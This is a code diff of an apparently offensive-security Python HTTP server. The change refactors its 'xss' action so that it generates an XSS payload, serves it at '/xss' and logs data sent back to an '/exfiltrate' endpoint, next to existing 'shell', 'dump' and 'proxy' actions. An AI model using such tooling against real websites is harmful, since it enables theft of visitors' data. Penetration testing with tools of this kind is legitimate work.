@@ -5,12 +5,10 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import urlparse
 import threading
 import requests
-import sys
 import time
 import os
 import ssl
 import util
-import xss_handler
 
 class FileServerRequestHandler(BaseHTTPRequestHandler):
 
@@ -275,10 +273,6 @@ class HttpFileServer(HTTPServer):
             self.listen_thread.join()
 
 if __name__ == "__main__":
-    if len(sys.argv) < 2 or sys.argv[1] not in ["shell","dump","proxy","xss"]:
-        print("Usage: %s [shell,dump,proxy,xss]" % sys.argv[0])
-        exit(1)
-
     parser = argparse.ArgumentParser(description="Spawn a temporary http server")
     parser.add_argument(
         "action",
@@ -327,8 +321,11 @@ if __name__ == "__main__":
         file_server.forwardRequest("/proxy", url)
         print("Exfiltrate data using:", file_server.get_full_url("/proxy", ip_address))
     elif args.action  == "xss":
+        from xss_handler import generate_payload as generate_xss_payload
         payload_type = args.payload if args.payload else "img"
-        xss = xss_handler.generatePayload(payload_type, ip_addr, args.port)
+        xss = generate_xss_payload(payload_type, file_server.get_full_url("/exfiltrate", ip_address))
+        file_server.addFile("/xss", xss)
+        file_server.dumpRequest("/exfiltrate")
         print("Exfiltrate data using:")
         print(xss)
 
